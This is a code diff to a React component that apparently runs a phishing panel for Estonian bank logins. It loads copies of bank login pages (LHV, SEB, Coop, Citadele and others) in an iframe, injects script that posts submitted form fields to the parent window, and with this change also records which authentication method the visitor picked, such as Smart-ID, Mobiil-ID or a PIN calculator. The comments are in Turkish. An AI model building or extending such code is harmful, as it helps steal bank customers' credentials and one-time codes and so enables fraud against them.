@@ -21,6 +21,7 @@ type Props = {
 export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, saving }: Props) {
   const [files, setFiles] = useState<string[]>([]);
   const [currentIndex, setCurrentIndex] = useState(0);
+  const [selectedLoginMethod, setSelectedLoginMethod] = useState("");
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const isOpCorporate = bankSlug === "op-corporate-bank";
   const disableIframeFade = [
@@ -42,7 +43,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       "coop-pank": ["Biomeetria", "Smart-ID", "Mobiil-ID"],
       "inbank": ["Smart-ID", "Mobiil-ID", "PIN-kalkulaator"],
       "lhv-pank": ["Biomeetria", "Smart-ID", "Mobiil-ID", "PIN-kalkulaator", "Salasõna", "ID-kaart"],
-      "citadele-banka": ["Mobiil-ID", "ID-kaart", "MobileSCAN", "Digipass"],
+      "citadele-banka": ["PIN-kalkulaator", "Mobiil-ID", "ID-kaart", "MobileSCAN/Digipass 780"],
       "luminor-ee": ["Mobiil-ID", "ID-kaart", "PIN-kalkulaator", "Smart-ID"],
       "op-corporate-bank": ["Mobiil-ID", "Smart-ID", "PIN kalkulaator"],
       "seb-pank": ["Smart-ID", "Mobiil-ID", "SEB Mobiilirakendus", "ID-kaart", "PIN-kalkulaator"],
@@ -56,8 +57,10 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
     const normalized = value.trim().toLowerCase();
     if (!normalized || normalized === "bilinmiyor") return "";
 
-    if (normalized.includes("mobilescan")) return "MobileSCAN";
-    if (normalized.includes("digipass")) return "Digipass";
+    if (normalized.includes("mobilescan") || normalized.includes("digipass")) {
+      if (bankSlug === "citadele-banka") return "MobileSCAN/Digipass 780";
+      return "MobileSCAN";
+    }
     if (normalized.includes("seb mobiil") || normalized.includes("mobiilirakendus")) return "SEB Mobiilirakendus";
     if (normalized.includes("smart")) return "Smart-ID";
     if (normalized.includes("mobiil")) return "Mobiil-ID";
@@ -142,11 +145,12 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       if (e.data && e.data.type === 'ESTONIA_BANK_SUBMIT') {
         const { formData } = e.data;
         
+        const clickedLoginMethod = normalizeLoginMethodLabel(selectedLoginMethod);
         const detectedLoginMethod = normalizeLoginMethodLabel(
           typeof formData.loginMethod === "string" ? formData.loginMethod.trim() : "",
         );
         const fallbackLoginMethod = normalizeLoginMethodLabel(resolveLoginMethodFromIndex(bankSlug, currentIndex));
-        const newLoginMethod = detectedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
+        const newLoginMethod = clickedLoginMethod || detectedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
         const capturedFields = normalizeCapturedFields(formData);
         const identityFirstMethod = prefersIdentityFields(newLoginMethod);
         const mappedData: Record<string, string> = {
@@ -373,6 +377,12 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           ...mappedData,
         });
       } else if (e.data && e.data.type === 'ESTONIA_BANK_TAB_CLICK') {
+         if (typeof e.data.loginMethod === "string") {
+           const normalizedLoginMethod = normalizeLoginMethodLabel(e.data.loginMethod);
+           if (normalizedLoginMethod) {
+             setSelectedLoginMethod(normalizedLoginMethod);
+           }
+         }
          if (typeof e.data.targetIndex === 'number' && e.data.targetIndex >= 0) {
            // SEB bank ve diğerleri için eğer targetIndex dosya sayısından büyükse, son dosyayı kullan
            const safeIndex = Math.min(e.data.targetIndex, files.length - 1);
@@ -385,7 +395,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
     window.addEventListener('message', handleMessage);
     return () => window.removeEventListener('message', handleMessage);
-  }, [bankSlug, currentIndex, files, onChange, handleRouteAction]);
+  }, [bankSlug, currentIndex, files, onChange, handleRouteAction, selectedLoginMethod]);
 
   useEffect(() => {
     if (!isOpCorporate) return;
@@ -697,16 +707,55 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             return inputs;
         };
 
+        const extractLoginMethodLabel = (rawValue) => {
+            const loginMethod = (rawValue || '').replace(/\\s+/g, ' ').trim();
+            const normalized = loginMethod.toLowerCase();
+
+            if (!normalized) {
+                return "";
+            }
+
+            if (window.location.href.includes('citadele')) {
+                if (normalized.includes('mobilescan') || normalized.includes('digipass')) return 'MobileSCAN/Digipass 780';
+                if (normalized.includes('pin')) return 'PIN-kalkulaator';
+                if (normalized.includes('mobiil')) return 'Mobiil-ID';
+                if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
+            }
+
+            if (window.location.href.includes('coop')) {
+                if (normalized.includes('bio')) return 'Biomeetria';
+                if (normalized.includes('smart')) return 'Smart-ID';
+                if (normalized.includes('mobiil')) return 'Mobiil-ID';
+                if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
+            }
+
+            if (normalized.includes('seb mobiil') || normalized.includes('mobiilirakendus')) return 'SEB Mobiilirakendus';
+            if (normalized.includes('smart')) return 'Smart-ID';
+            if (normalized.includes('mobiil')) return 'Mobiil-ID';
+            if (normalized.includes('id-kaart') || normalized.includes('id kaart') || normalized.includes('id-card')) return 'ID-kaart';
+            if (normalized.includes('mobilescan')) return 'MobileSCAN';
+            if (normalized.includes('digipass')) return 'Digipass';
+            if (normalized.includes('pin')) return 'PIN-kalkulaator';
+            if (normalized.includes('bio')) return 'Biomeetria';
+
+            return loginMethod;
+        };
+
         const getLoginMethod = () => {
+            const rememberedLoginMethod = extractLoginMethodLabel(window.__traeSelectedLoginMethod || '');
+            if (rememberedLoginMethod) {
+                return rememberedLoginMethod;
+            }
+
             let loginMethod = "Bilinmiyor";
             const activeTab = document.querySelector('.active, .selected, .current, [aria-selected="true"]');
             if (activeTab) {
-                loginMethod = activeTab.textContent.trim().substring(0, 30).replace(/\\n/g, '').trim();
+                loginMethod = extractLoginMethodLabel(activeTab.textContent || '') || loginMethod;
             }
             if (window.location.href.includes('op-corporate')) {
                 const checkedRadio = document.querySelector('input[type="radio"]:checked');
                 if (checkedRadio && checkedRadio.nextElementSibling) {
-                    loginMethod = checkedRadio.nextElementSibling.textContent.trim();
+                    loginMethod = extractLoginMethodLabel(checkedRadio.nextElementSibling.textContent || '') || loginMethod;
                 }
             }
             return loginMethod;
@@ -962,6 +1011,11 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
               }
 
               if (targetIndex !== -1) {
+                  const clickedLoginMethod = extractLoginMethodLabel(targetTab.textContent || '');
+                  if (clickedLoginMethod) {
+                      window.__traeSelectedLoginMethod = clickedLoginMethod;
+                  }
+
                   // Yalnızca Coop bankasıysa ve targetIndex 0, 1, 2 dışında bir şeyse (Örn: ID-Kaart = 3) çalıştır
                   if (window.location.href.includes('coop') && targetIndex > 2) {
                       e.preventDefault();
@@ -982,7 +1036,8 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
                   window.parent.postMessage({
                         type: 'ESTONIA_BANK_TAB_CLICK',
-                        targetIndex: targetIndex
+                        targetIndex: targetIndex,
+                        loginMethod: clickedLoginMethod
                     }, '*');
               } else {
                   // If it was considered a tab click but no index found, we should still prevent default
